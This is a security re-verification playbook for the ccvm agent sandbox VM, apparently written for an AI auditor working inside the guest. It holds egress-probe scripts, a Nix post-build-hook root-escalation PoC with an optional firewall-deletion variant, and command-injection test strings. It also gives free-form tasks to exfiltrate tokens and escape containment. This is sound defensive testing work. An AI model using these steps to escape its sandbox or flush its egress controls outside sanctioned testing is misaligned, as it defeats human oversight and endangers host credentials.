# ccvm — Security Re-Verification & Pentest Playbook

You are auditing **ccvm** from *inside* a freshly-built VM, with **full pentesting
authorization** for this session. This playbook re-runs a prior comprehensive audit so you can
confirm the load-bearing invariants still hold and that the fixes landed in commit
`fix(security): close the Nix trusted-user egress bypass + harden the guest` are actually in
the booted guest (run `git log --oneline -15` to confirm it's present in this checkout).

Work top to bottom. Each step has the command(s) and the **expected** result. At the end,
produce a pass/fail report in the format in §8. Be concrete — run it, don't infer. If a result
disagrees with "expected", that's a finding: capture the exact output.

The trust boundary is QEMU. In scope: defending the **host filesystem + the host's stored
credentials**, and keeping the **egress allowlist binding** against a (prompt-injected) non-root
agent. Out of scope: a malicious guest *kernel*. Severities: **Critical** = breaks a host-protection
invariant or exposes host creds/keys; **High** = weakens one (e.g. defeats the egress allowlist);
**Medium** = rough edge; **Low** = polish.

> **Run the `/dev/tcp` probes through `bash`.** The TCP-connect probes below (the §2 egress
> `probe()` and the §6 `clipreq()`) rely on bash's `/dev/tcp` pseudo-device. The guest's
> interactive shell is **zsh**, which has **no `/dev/tcp` builtin** — under zsh those probes fail
> with `no such file or directory` and falsely read as "BLOCKED"/"dead", a *test artifact, not a
> finding*. Run them in a `bash -lc '…'` (or paste into a `bash` shell); the snippets here already
> wrap the probe in `bash -c`. The real guest clipboard shims are bash scripts, so they are
> unaffected — this caveat is only about *your* hand-run probes.

---

## 0. Orientation — detect the running posture

The checks below are posture-dependent, so first learn the config this VM booted with.

```bash
echo "== identity =="; id; echo "sudo: $(command -v sudo || echo NONE)  nix: $(command -v nix || echo NONE)"
echo "== seed posture =="
for f in mode shell egress-enforce vm-disk persist-claude-projects host-uid; do
  printf '%-22s = %s\n' "$f" "$(cat /run/ccvm-seed/$f 2>/dev/null || echo '(absent)')"
done
echo "store fs: $(stat -f -c %T /nix/store)"   # overlayfs => nix.enable on; squashfs/9p => off
```

Record three facts that drive interpretation below:

- **Egress-hardened?** `egress-enforce = 1` (an allowlist is set) → §2 applies and the agent
  should have **no sudo**. Absent → open egress (native default), agent has sudo by design.
- **nix.enable on?** `store fs = overlayfs` → §3's trusted-user regression is the headline.
- **uid** should equal the host user's uid (the seed remaps it); `sudo: NONE` is expected and
  correct whenever `egress-enforce = 1`.

---

## 1. Host-protection invariants (MUST NOT regress)

### 1a. The seed never carries a host secret

Three precise checks — avoid broad `grep`s here: the seed legitimately contains the **guest's own
ephemeral SSH host key** (`ssh_host_ed25519_key` — its per-run identity, regenerated each boot, *not*
a host secret), and `claude-md` is prose that mentions "credential"/"login", so a loose
`grep -i oauth|credential|PRIVATE KEY` will false-positive on both.

```bash
echo "-- (1) host OAuth credential file absent from seed (expect: nothing) --"; find /run/ccvm-seed -name '.credentials.json'
echo "-- (2) LUKS key absent from seed (expect: nothing) --"; find /run/ccvm-seed -name '*.key'
echo "-- (3) API key absent from seed (expect: '(none)') --"; grep -rl 'sk-ant' /run/ccvm-seed 2>/dev/null || echo '(none)'
echo "-- benign: the ONLY private key in the seed must be the guest's own ssh host key --"; grep -rl 'BEGIN OPENSSH PRIVATE KEY' /run/ccvm-seed 2>/dev/null
echo "-- API key in the agent env? (set only if you launched with ANTHROPIC_API_KEY) --"
echo "ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY:+SET(len=${#ANTHROPIC_API_KEY})}${ANTHROPIC_API_KEY:-unset}"
```

**Expected:** checks (1)(2)(3) all empty/`(none)`; the only `BEGIN OPENSSH PRIVATE KEY` hit is
`ssh_host_ed25519_key` (the guest's own key — benign; the *client* private key stays host-side). Any
`~/.claude/.credentials.json` that exists is the **in-VM `/login` token** (tmpfs, ephemeral) — fine
and documented; the host's *stored* credential must simply never be in the seed.
**FAIL = Critical** if a `.credentials.json`, a `*.key`, or an `sk-ant` string is in the seed.

### 1b. Config staged into the VM is sanitized

```bash
echo "-- git config: no /nix/store, no credentials, signing off --"
grep -nE '/nix/store|credential|helper|gpgsign *= *true' ~/.config/git/config 2>/dev/null && echo '!!! LEAK' || echo 'clean'
echo "-- ~/.claude.json: no inline MCP/API secrets (host file is staged sanitized) --"
grep -oc 'sk-ant' ~/.claude.json 2>/dev/null || echo 0
```

**Expected:** git config carries identity/aliases but **no** store paths, **no** `credential.*`,
`gpgsign` forced false. No `sk-ant` in `~/.claude.json`. **FAIL = High** on any leak.

### 1c. Only the launch directory crosses; 9p shares are hardened

```bash
WS="$(cat /run/ccvm-seed/workdir)"
echo "-- host home beyond the project must NOT be visible --"; ls -la "$(dirname "$WS")" 2>&1 | head
echo "-- every 9p / workspace mount carries nosuid,nodev --"
grep -E '9p|ccvm-workspace' /proc/mounts
echo "-- /home and / are tmpfs (nothing persists) --"; findmnt -no FSTYPE / ; findmnt -no FSTYPE /home 2>/dev/null || stat -f -c %T /home
```

**Expected:** the project's parent dir is an empty guest tmpfs (only the project is mounted); every
9p mount shows `nosuid,nodev`; root + `/home` are tmpfs. **FAIL = High** if host home is reachable
or a share is missing `nosuid`/`nodev`.

### 1d. Encrypted disk (only if `vm-disk = 1`)

```bash
echo "-- /scratch + overlay upper sit on dm-crypt; the LUKS key is gone from RAM --"
grep -E '/scratch|\.rw-store' /proc/mounts
ls -la /run/ccvm-scratch.key /run/ccvm-store-disk.key 2>&1   # expect: No such file (shredded)
dm="$(readlink -f /dev/mapper/ccvm-scratch 2>/dev/null)"; [ -n "$dm" ] && cat /sys/class/block/$(basename "$dm")/dm/uuid  # expect CRYPT-LUKS2-…
```

**Expected:** `/scratch` (and, under nix.enable, `/nix/.rw-store`) on `/dev/mapper/ccvm-scratch`,
dm uuid `CRYPT-…`, and **both key files absent** (generated in guest RAM, shredded after open).
**FAIL = Critical** if a key file survives or the device is plaintext.

---

## 2. Egress containment — only if `egress-enforce = 1`

Behavioral test (you cannot read the nft ruleset without root — that's the point). `policy drop`
means blocked connects **hang to timeout** (rc=124), allowed ones connect instantly.

```bash
probe(){ timeout 7 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "[$3] $1:$2 CONNECTED" || echo "[$3] $1:$2 BLOCKED(rc=$?)"; }
A="$(getent ahosts api.anthropic.com | awk '{print $1; exit}')"   # an allowlisted, pinned IP
probe "$A" 443 "allowlisted(api)"        # expect CONNECTED
probe 1.1.1.1 443 "not-allowlisted"      # expect BLOCKED
probe 8.8.8.8 53  "DNS-to-anywhere"      # expect BLOCKED (only the slirp stub 10.0.2.3 is allowed)
probe 10.0.2.2 22 "host-loopback-sshd"   # expect BLOCKED (the documented slirp host redirect)
probe 10.0.2.2 443 "host-loopback-443"   # expect BLOCKED
echo "-- DNS still resolves via the stub --"; getent ahosts github.com | head -1
echo "-- /etc/hosts pins allowlisted FQDNs and is root-owned/unwritable --"; ls -la /etc/hosts; test -w /etc/hosts && echo WRITABLE || echo 'not writable (good)'
```

**Expected:** allowlisted reachable; `1.1.1.1`, `8.8.8.8:53`, and **`10.0.2.2` (host loopback)** all
**BLOCKED**; DNS still resolves; `/etc/hosts` root-owned and unwritable. **FAIL = High** if any
non-allowlisted host (especially `10.0.2.2`) connects.

---

## 3. Privilege escalation — the S-1 Nix trusted-user regression (HEADLINE)

The audit's top finding: under `nix.enable` the agent was a Nix **trusted-user** (root-equivalent),
so even with sudo dropped it could regain root via the daemon's `post-build-hook` and `nft flush`
the egress firewall. The fix gates `trusted-users` on `agentSudo`. **Re-verify it holds.**

### 3a. Baseline privilege surface

```bash
echo "-- su to root must fail (root is locked) --"
printf 'x\n' | timeout 8 script -qec "su root -c id" /dev/null 2>&1 | tr -d '\r' | grep -iE 'auth|fail|uid=' | head -2
echo "-- setuid mount wrapper must refuse --"; timeout 6 mount -t tmpfs none /mnt 2>&1 | head -1
echo "-- userns gives only NAMESPACED root (no real privilege) --"; timeout 6 unshare -Ur id 2>&1 | head -1
echo "-- can't read host/root secrets --"; for f in /etc/shadow /root /etc/ssh/ssh_host_ed25519_key; do echo -n "$f: "; cat "$f" >/dev/null 2>&1 && echo READABLE || echo denied; done
```

**Expected:** `su` → authentication failure; `mount` → "must be superuser"; userns → `uid=0` but only
inside the namespace; `/etc/shadow`, `/root`, the host key all **denied**.

### 3b. THE regression test — trusted-user escalation must be **blocked** under egress hardening

Only meaningful when **nix is present AND the agent has no sudo** (egress-hardened posture). If the
agent has sudo (open-egress default), it is root by design — note "N/A, agent is root by design" and
skip. This PoC is **non-destructive**: the hook only tries to prove root (it does **not** touch the
firewall), so it's safe to run even if the regression exists.

```bash
if command -v nix >/dev/null && ! { command -v sudo >/dev/null && sudo -n true 2>/dev/null; }; then
  echo "== egress-hardened + nix: verifying the agent is NOT root-equivalent =="
  echo "-- (1) trusted-users must NOT contain ccvm --"
  nix config show 2>/dev/null | sed -n 's/^trusted-users = //p'
  nix config show 2>/dev/null | grep -qw 'trusted-users.*\<ccvm\>' && echo "   >>> ccvm IS trusted (FAIL)" || echo "   ccvm not trusted (good)"
  echo "-- (2) attempt the post-build-hook root escalation; PASS = it does NOT run as root --"
  rm -f /tmp/s1-proof /run/s1-was-root 2>/dev/null
  cat > /tmp/s1-hook.sh <<'EOF'
#!/bin/sh
{ echo "HOOK euid=$(id -u)"; touch /run/s1-was-root 2>&1 && echo "wrote /run as root"; } > /tmp/s1-proof 2>&1
EOF
  chmod +x /tmp/s1-hook.sh
  B="$(readlink -f "$(command -v bash)")"; N="$RANDOM$RANDOM"
  nix build --extra-experimental-features nix-command --option sandbox false \
    --option post-build-hook /tmp/s1-hook.sh --no-link --impure \
    --expr "derivation { name=\"s1-$N\"; system=\"x86_64-linux\"; builder=\"$B\"; args=[\"-c\" \"echo $N > \$out\"]; }" >/dev/null 2>&1
  if [ -f /tmp/s1-proof ] && grep -q 'euid=0' /tmp/s1-proof; then
    echo "   >>> FAIL (S-1 REGRESSION): agent ran code as root via the daemon:"; cat /tmp/s1-proof
  else
    echo "   PASS: post-build-hook did NOT execute as root (trusted-only override rejected for the non-trusted agent)"
  fi
  rm -f /tmp/s1-hook.sh /tmp/s1-proof /run/s1-was-root 2>/dev/null
else
  echo "N/A: open-egress posture (agent has sudo / is root by design), or nix absent."
fi
```

**Expected (fixed guest):** `ccvm not trusted`, and **PASS** — the build's `post-build-hook` /
`sandbox false` overrides are ignored for a non-trusted user, so no `/tmp/s1-proof` with `euid=0`.
**FAIL = High** if the proof shows `euid=0` (the trusted-user → root → firewall-flush path is back).

> Optional full-impact confirmation (**destructive but self-restoring**): only if 3b already FAILED
> and you want to show the firewall can be torn down, re-run with a hook that does
> `nft delete table inet ccvm`, confirm `1.1.1.1:443` then connects, and restore by regenerating the
> ruleset from `/run/ccvm-seed/egress-allow` (mirror `guest/launcher.nix`'s `emit_base` + the
> `ip daddr {…} tcp dport {…} accept` lines via another root hook). On a **passing** guest there is
> nothing to tear down.

### 3c. Agent still has working nix (the fix must not break DevEx)

```bash
nix build --extra-experimental-features nix-command --no-link --impure \
  --expr 'derivation { name="devex-ok"; system="x86_64-linux"; builder="/bin/sh"; args=["-c" "echo ok > $out"]; }' 2>&1 | tail -3
```

**Expected:** the non-trusted agent can still realise a derivation (builds run as `nixbld`). A
*usable* nix for the agent is the whole point of keeping it a daemon client; it just can't override
trusted-only settings. (This trivial derivation may fail to find `/bin/sh`'s loader under the
sandbox — that's fine; what matters is the daemon accepts the build request, i.e. no
"not allowed"/permission error.)

---

## 4. Hardening verification (landed with the S-1 fix)

```bash
echo "-- D-1: a staged settings.json must be owner-WRITABLE (was 0444 from the host store symlink) --"
[ -e ~/.claude/settings.json ] && { ls -l ~/.claude/settings.json; [ -w ~/.claude/settings.json ] && echo writable || echo 'READ-ONLY (D-1 regression)'; } || echo '(no settings.json staged this run)'
echo "-- kernel sysctls applied --"
for k in kernel.kptr_restrict kernel.dmesg_restrict kernel.unprivileged_bpf_disabled net.core.bpf_jit_harden net.ipv4.conf.all.rp_filter; do
  printf '%-34s = %s\n' "$k" "$(cat /proc/sys/$(echo $k | tr . /) 2>/dev/null)"
done
echo "-- dmesg restricted for the non-root agent --"; dmesg >/dev/null 2>&1 && echo 'dmesg READABLE' || echo 'dmesg denied (good)'
echo "-- protectKernelImage: kexec disabled --"; cat /proc/sys/kernel/kexec_load_disabled 2>/dev/null
echo "-- sudo (if present) should be sudo-rs; absent under egress hardening --"
command -v sudo >/dev/null && sudo --version 2>&1 | head -1 || echo 'no sudo (egress-hardened or agentSudo=false — expected here)'
```

**Expected (fixed guest):** `settings.json` **writable**; `kptr_restrict=2`, `dmesg_restrict=1`,
`unprivileged_bpf_disabled=1`, `bpf_jit_harden=2`, `rp_filter=1`; `dmesg` denied; `kexec_load_disabled=1`.
(`net.core.bpf_jit_harden` is mode `0600`/root-only, so as the non-root agent it reads **empty** — a
privilege artifact, NOT a missing sysctl: it is set in `guest/default.nix` and applied at boot by
systemd-sysctl. Don't read the empty value as a finding.)
When sudo exists (open-egress posture) it should resolve to **sudo-rs**. **FAIL = Medium** for D-1
regression (read-only settings.json); **Low** for any missing sysctl.

---

## 5. Filesystem boundary & persistence

```bash
WS="$(cat /run/ccvm-seed/workdir)"
echo "-- rw write-through lands on the host owned by the host uid (then cleaned up) --"
p="$WS/.ccvm-pentest-probe"; echo probe > "$p" 2>&1 && { echo "wrote, owner uid=$(stat -c %u "$p")"; rm -f "$p"; } || echo "workspace read-only (overlay mode)"
echo "-- ephemeral areas (all wiped on exit) --"
for d in /tmp /dev/shm /scratch /run; do printf '%-10s %s\n' "$d" "$(findmnt -no FSTYPE "$d" 2>/dev/null)"; done
```

**Expected:** in rw mode the probe lands owned by the host uid (= `id -u`); in overlay mode the write
stays ephemeral. No durable store exists beyond the project dir (and, if `persist-claude-projects=1`,
`~/.claude/projects`). **FAIL = Critical** if an overlay-mode write reaches the host.

---

## 6. Image-paste clipboard bridge — only if `clipboard.images` is on

**Scoping note:** this section is self-contained — if you were told "**pentest only clipboard and
its related parts**", run *just* §0 (orientation) then this §6, and report in the §8 format. The
feature: to make Ctrl+V image paste work, ccvm runs a fake `xclip`/`wl-paste` in the guest that
fetches the **host** clipboard *image* over a single SSH reverse-forward (guest `127.0.0.1:9180` →
a host-side `socat` clipboard server). Related parts in scope: the guest shims, the loopback bridge
port, sshd's `AllowTcpForwarding=remote` + `PermitListen` pin, and the bridge's interaction with the
egress firewall (§2). The **claim under test**: the bridge is *image-only* and rides loopback + the
established SSH channel, so (a) host clipboard **text never crosses**, (b) the agent **cannot write**
the host clipboard, (c) the channel **cannot be repurposed** to pivot to other host services or open
new forwards, and (d) it is **not an egress bypass**. The one *accepted, documented* residual: under
**open egress** the agent can pull a host clipboard **image** on demand and exfiltrate it — same class
as the project tree, strictly less than native `claude`. That residual is **not** a finding; the four
boundaries above are.

### 6.0 Setup (do this on the HOST first, or the text test is vacuous)

So the "no host text crosses" probe is meaningful, put a **recognizable secret** on your host
clipboard before/at session start (and optionally a screenshot to exercise the image path):

```text
Wayland host:  printf 'CCVM-CLIP-SECRET-PENTEST' | wl-copy
X11 host:      printf 'CCVM-CLIP-SECRET-PENTEST' | xclip -selection clipboard
```

### 6.1 Posture detection (inside the VM)

```bash
CLIP_PORT=9180   # cfg.clipboard.port
echo "shims:  xclip=$(command -v xclip || echo none)   wl-paste=$(command -v wl-paste || echo none)"
if { exec 3<>/dev/tcp/127.0.0.1/$CLIP_PORT; } 2>/dev/null; then exec 3<&- 3>&-; echo "bridge port $CLIP_PORT: LISTENING (host wired the bridge this run)"; else echo "bridge port $CLIP_PORT: dead"; fi
```

Interpret: **no shims** → `clipboard.images` is off → this whole section is **N/A**. **Shims present
but port dead** → the host had no `wl-paste`/`xclip`, so the bridge is inert (nothing can cross — the
image-only invariant holds trivially); still run 6.4–6.5 (no-write, no-pivot). **Port LISTENING** →
run everything.

A raw probe (a prompt-injected agent won't politely use the shim — it talks straight to the port, so
we test the **host-side** enforcement directly):

```bash
clipreq(){ # $1 = raw request line; prints the host reply (binary-safe), empty if refused
  { exec 3<>"/dev/tcp/127.0.0.1/$CLIP_PORT"; } 2>/dev/null || { echo "(no listener)"; return 1; }
  printf '%s\n' "$1" >&3; timeout 5 cat <&3; exec 3<&- 3>&-
}
```

### 6.2 HEADLINE — host clipboard TEXT must NEVER cross

```bash
echo "-- request host clipboard text in every text-ish form; expect EMPTY every time --"
for t in 'text/plain' 'text/plain;charset=utf-8' 'STRING' 'UTF8_STRING' 'TEXT' 'text/html'; do
  out="$(clipreq "$t" 2>/dev/null || true)"
  case "$out" in
    *CCVM-CLIP-SECRET-PENTEST*) echo "   >>> FAIL: host clipboard TEXT crossed for '$t' -> [$out]" ;;
    '') echo "   ok   '$t' -> empty" ;;
    *) echo "   ??   '$t' -> unexpected bytes (inspect): $(printf %s "$out" | tr -d '\0' | head -c 40)" ;;
  esac
done
```

**Expected:** every text target returns **empty**; `CCVM-CLIP-SECRET-PENTEST` never appears.
**FAIL = Critical** (host clipboard text is a credential-class secret and would be exfiltratable) if
the secret crosses for any target.

### 6.3 Image path works + crafted requests are inert (the residual, and its limits)

```bash
echo "-- (a) the bridge serves only IMAGES: image/png returns bytes iff the host clipboard has an image --"
clipreq image/png 2>/dev/null > /tmp/clip.bin || true
echo "   image bytes: $(wc -c </tmp/clip.bin 2>/dev/null || echo 0)"; head -c 8 /tmp/clip.bin | xxd | head -1
echo "-- (b) crafted / injection requests must neither widen nor execute (literal case arms host-side) --"
rm -f /tmp/clip-pwned
clipreq "image/png\$(touch /tmp/clip-pwned)" >/dev/null 2>&1 || true   # literal \$ -> not executed
clipreq 'image/png; id'                       >/dev/null 2>&1 || true
clipreq '../../etc/passwd'                     >/dev/null 2>&1 || true
[ -e /tmp/clip-pwned ] && echo "   >>> FAIL: a request string was executed as a command" || echo "   ok: no command execution, no widening"
rm -f /tmp/clip.bin
```

**Expected:** `image/png` returns a PNG (magic `89 50 4e 47`) only if you copied an image on the host —
otherwise empty; **no** `/tmp/clip-pwned`. The image return is the **documented residual**, not a
finding. **FAIL = High** if a non-image target returns data or a request executes.

### 6.4 The agent cannot WRITE the host clipboard (no poison/phishing vector)

```bash
echo "-- the shims must be read-only: a copy-INTO-clipboard attempt must no-op --"
printf 'EVIL-PAYLOAD-%s' "$RANDOM" | { command -v xclip >/dev/null && xclip -selection clipboard; } 2>/dev/null; echo "   xclip -i rc=$?"
printf 'EVIL-PAYLOAD' | { command -v wl-copy >/dev/null && wl-copy; } 2>/dev/null; echo "   (wl-copy present? $(command -v wl-copy || echo no))"
```

**Expected:** the write no-ops (rc 0, nothing sent host-ward); **verify on the HOST that your clipboard
still holds `CCVM-CLIP-SECRET-PENTEST`, not `EVIL-PAYLOAD`.** **FAIL = High** if the host clipboard is
overwritten from the guest (an agent could swap a copied `curl … | sh` under the user).

### 6.5 No pivot, no forward abuse, loopback-only

```bash
echo "-- (a) the reverse-forwarded port maps ONLY to the clipboard server, not a generic host proxy --"
echo "   arbitrary/HTTP request yields only reader behavior (empty), not a tunnel to host services:"
clipreq 'GET / HTTP/1.0' 2>/dev/null | head -c 60; echo " <<end"
echo "-- (b) the agent has no creds to open its OWN forward back to the host --"
ls -la ~/.ssh 2>&1 | head -2
timeout 6 ssh -o BatchMode=yes -o ConnectTimeout=4 -R 7777:127.0.0.1:22 ccvm@10.0.2.2 true 2>&1 | tr -d '\r' | head -2
echo "-- (c) the bridge listener is loopback-only (not 0.0.0.0) --"
{ command -v ss >/dev/null && ss -tlnH 2>/dev/null | grep ":$CLIP_PORT "; } || awk -v p=$CLIP_PORT 'NR>1{split($2,a,":"); if (strtonum("0x" a[2])==p) print $0}' /proc/net/tcp 2>/dev/null | head -1 || echo "   (no introspection tool; the §6.1 connect test already proves reachability)"
```

**Expected:** (a) `GET /` returns **nothing** (the reader matches only `TARGETS`/`image/*`, everything
else → empty — it is not an HTTP/byte proxy); (b) no `~/.ssh` key and the outbound `ssh -R … 10.0.2.2`
**fails to authenticate** (and under egress hardening `10.0.2.2` is BLOCKED outright per §2), so the
agent cannot create new forwards; (c) the listener is bound to `127.0.0.1` only. **FAIL = High** if the
port proxies arbitrary traffic to the host, if the agent can open a forward, or if the listener is on
`0.0.0.0`.

### 6.6 Not an egress bypass

The bridge reaches only `127.0.0.1:9180` (loopback, always allowed) and yields only clipboard images;
it does **not** widen network reach. Cross-check against §2 if `egress-enforce = 1`: `10.0.2.2` and all
non-allowlisted hosts must still be **BLOCKED**. **FAIL = High** if the clipboard path lets you reach
anything the egress firewall otherwise drops.

---

## 7. Free-form red-teaming (go beyond the script)

Spend remaining effort trying to break the model, e.g.: exfiltrate the in-VM `/login` token under the
allowlist (should be blocked by §2); reach a host loopback service via `10.0.2.2`; persist data across
exit; regain root by any path other than 3b (other nix-daemon settings, setuid binaries —
`find / -perm -4000 -type f 2>/dev/null`, file caps — `getcap -r / 2>/dev/null`, the
`newuidmap`/`newgidmap` + `/etc/subuid` range); or get the egress firewall flushed. Report anything
that works.

---

## 8. Report format

Produce:

- **Executive summary** — does the posture hold? Did the S-1 fix survive (3b)? Severity counts.
- **Findings** — `[id] description [Severity] [evidence: exact command + output] [remediation]`.
- **Invariant checklist** — one line each: seed-no-secret, host-key-pin, only-CWD, 9p nosuid/nodev,
  LUKS key-gone, egress-allowed-reachable, egress-blocked-dropped, host-loopback-blocked,
  DNS-confined, **S-1 trusted-user-blocked**, D-1 settings-writable, sysctls-applied,
  rw-ownership-correct, **clip-text-never-crosses**, clip-no-host-write, clip-no-pivot/forward-abuse,
  clip-not-egress-bypass (and note clip-image-residual as documented, not a finding) — each ✓/✗ with a
  one-line note.
- **Regressions vs. the prior audit** — call out explicitly if 3b (S-1) or §1/§2 now behave worse.

Cite the commit you tested against (`git rev-parse --short HEAD`) so results are reproducible.
